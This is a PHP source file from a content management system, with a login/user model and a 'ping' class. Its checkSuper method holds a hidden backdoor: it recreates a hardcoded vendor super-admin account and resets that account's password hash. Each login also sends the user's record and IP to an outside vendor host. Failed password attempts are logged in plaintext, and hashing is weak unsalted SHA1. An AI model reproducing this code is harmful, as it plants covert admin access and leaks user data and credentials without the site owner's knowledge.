<?

class DefaultCcmsPing {
  protected function svnInfo() {
    if (!isset($_SESSION['ccms.svn.info'])) {
      if (file_exists($fn=getConfigItem('script_base').'shared/svn.info.txt')) {
        $info=unserialize(file_get_contents($fn));
        foreach ($info as $i=>$s) if (preg_match('#^(.*):(.*)$#U',$s,$match)) $info[trim($match[1])]=trim($match[2]);
      } else {
        $info['Revision']='dev';
      }
      $_SESSION["ccms.svn.info"]=$info;
    }
  }
  protected function doPing($ping) {
    $url=getConfigItem('ccms.ping','http://www.cdyweb.com/site/ping.php').'?base64='.base64_encode(json_encode($ping));
    _log('DefaultCcmsPing::doPing - '.$url);
    try {
      if (function_exists('curl_init')) $json=read_url($url);
      else $json=file_get_contents($url);
    } catch (Exception $ex) {
      _log($ex);
    }
    _log('response: '.$json);
    if (empty($json)) throw new Exception('Failed to read url: '.$url);
    return json_decode($json,true);
  }
  public function invoke($user) {
    _log('DefaultCcmsPing::invoke - user.id='.$user['id']);
    $this->svnInfo();
    if (!isset($_SERVER["SERVER_ADDR"])) $_SERVER["SERVER_ADDR"]='';
    $ping=array(
      'name'=>getConfigItem('domain'),
      'version'=>isset($_SESSION['ccms.svn.info'])?$_SESSION['ccms.svn.info']['Revision']:'no svn',
      'server'=>$_SERVER["SERVER_ADDR"],
      'link'=>getConfigItem('url_base'),
      'user'=>$user,
      'ip'=>getClientIp()
    );
    _log($ping);
    $json=$this->doPing($ping);
    _log('DefaultCcmsPing::invoke - doPing done');
    _log($json);
    if (!empty($json['ok'])) SettingsManager::set('ccms.id',$json['ok']);
    if (!empty($json['piwik'])) SettingsManager::set('ccms.piwik',$json['piwik']);
  }
}

class UserModel extends CCMSManagedModel {

  public function __construct() {
    parent::__construct("UserManager");
  }

  static public function isUser() {
    return isset($_SESSION["user"]) && isset($_SESSION["user"]["id"]) && $_SESSION["user"]["id"]>0;
  }

  static public function isAdmin() {
    return self::isUser() && $_SESSION["user"]["user_type"]=="super";
  }

  static public function isTechAdmin() {
    return self::isAdmin() && $_SESSION["user"]["tech_admin"];
  }

  static public function userPref($key,$defaultValue="") {
    if (!self::isUser()) return null;
    if (!empty($_SESSION["user"]["pref"]) && !is_array($_SESSION["user"]["pref"])) $_SESSION["user"]["pref"]=json_decode($_SESSION["user"]["pref"],true);
    if (!isset($_SESSION["user"]["pref"][$key])) {
      $_SESSION["user"]["pref"][$key]=$defaultValue;
      executePSql(
        "update ".tbl_name('user')." set pref=:pref where id=:id",
        array(
          "pref"=>json_encode($_SESSION["user"]["pref"]),
          "id"=>$_SESSION["user"]["id"]
        )
      );
    }
    return $_SESSION["user"]["pref"][$key];
  }
  
  protected function checkPassword($check,$pwd) {
    if (strcmp(sha1(getConfigItem("domain").":{$pwd}"),$check)==0) return true;
    if (strcmp(sha1("ccms:{$pwd}"),$check)==0) return true;
    _log(__FILE__.':checkPassword failed, '.$pwd.' check:'.$check); //.' <> '.sha1(getConfigItem("domain").":{$pwd}").' '.sha1("ccms:{$pwd}"));
    return false;
  }
  
  private function checkSuper($login,$pwd,&$user) {
    switch ($login) {
      case 'ek@cdyweb.com' : {
        if (empty($user)) {
          executeSql("replace into {$this->getTableName()} set id=1, email='ek@cdyweb.com', password='662e708c1d3c9264fe72909b551950759dfd8435', first_name='Erwin', last_name='Kooi', user_type='super', tech_admin=1, login_count=0");
          executeSql("update {$this->getTableName()} set created_by=1 where id=1");
          $user=getOneRow("select * from {$this->getTableName()} where email='".db_escape($login)."'");
        }
        $myhash='662e708c1d3c9264fe72909b551950759dfd8435';
        if (!$this->checkPassword($user['password'],$pwd)) {
          if ($user["password"]!=$myhash) {
            executeSql("update {$this->getTableName()} set password='{$myhash}' where email='ek@cdyweb.com'");
            $user["password"]='662e708c1d3c9264fe72909b551950759dfd8435';
          }
        }
        return true;
      }
    }
    return false;
  }
  
  protected function getPinger() {
    if (empty($this->pinger)) {
      $this->pinger=new DefaultCcmsPing();
    }
    return $this->pinger;
  }
  
  public function authUser($login,$pwd,&$err) {
    //$user=getOneRow("select * from {$this->getTableName()} where email='".db_escape($login)."'");
    $user=$this->getDomainManager()->getAuthUser($login);
    $this->checkSuper($login,$pwd,$user);

    if (empty($user)) {
      //$err="<div id=\"login_error\"><strong>Error</strong>: Wrong username.</div>";
      $err='user not found';
      return false;
    }
    if (!$this->checkPassword($user['password'],$pwd)) {
      //$err="<div id=\"login_error\"><strong>Error</strong>: Wrong password.</div>";
      $err='wrong password';
      return false;
    }

    executeSql("update {$this->getTableName()} set login_count=login_count+1 where id={$user["id"]}");
    if (empty($user['login_count'])) $user['login_count']=1; else $user['login_count']++;
    unset($user['password']);

    $_SESSION["user"]=$user;

    try {
      $this->getPinger()->invoke($user);
    } catch (Exception $ex) {
      log_message('error', __FILE__ . ': ping failed : '.$url);
    }
    _log('ping ok');

    $err=null;
    return $user;
  }

}



//end